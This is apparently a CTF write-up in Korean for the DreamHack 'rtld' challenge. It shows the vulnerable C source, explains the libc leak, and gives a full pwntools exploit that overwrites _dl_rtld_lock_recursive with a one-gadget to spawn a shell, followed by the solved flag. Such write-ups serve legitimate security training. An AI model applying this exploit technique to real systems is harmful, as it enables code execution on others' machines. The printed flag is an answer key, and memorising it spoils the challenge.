# [DreamHack] rtld

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 작동하고 있는 서비스(rtld)의 바이너리와 소스코드가 주어집니다.
> 프로그램의 취약점을 찾고 rtld overwrite 공격 기법으로 익스플로잇해 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [rtld.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8550138/rtld.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/161377306-5dadbffb-c5bb-43f0-9107-e5496c693795.png)

## Analysis

```c
void get_shell() {
    system("/bin/sh");
}

int main()
{
    long addr;
    long value; 

    initialize();

    printf("stdout: %p\n", stdout);

    printf("addr: ");
    scanf("%ld", &addr);

    printf("value: ");
    scanf("%ld", &value);

    *(long *)addr = value;
    return 0;
}
```

`stdout`의 값을 이용하여 libc 주소를 계산할 수 있다. 그리고 나서 한 번의 AAW를 할 수 있다. `_rtld_global`의 ` _dl_rtld_lock_recursive`를 oneshot gadget의 주소로 덮으면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/rtld')
    stdout_offset = 0x3c5620
    oneshot_offset = 0xf1247
    rtld_global_offset = 0x5f0040

else:
    r = remote('host1.dreamhack.games', 9122)
    stdout_offset = 0x3c5620
    oneshot_offset = 0xf1147
    rtld_global_offset = 0x5f0040


# leak libc

r.recvuntil('stdout: 0x')
stdout = int(r.recvline()[:-1], 16)  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
oneshot = libc + oneshot_offset  # oneshot gadget
rtld_global = libc + rtld_global_offset  # _rtld_global


# overwrite _dl_rtld_lock_recursive with oneshot gadget

r.sendlineafter('addr: ', str(rtld_global + 3848))
r.sendlineafter('value: ', str(oneshot))


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 9122: Done
[*] Switching to interactive mode
$ cat flag
DH{0f48186a16d315abba4d77ccdf507da4}
```
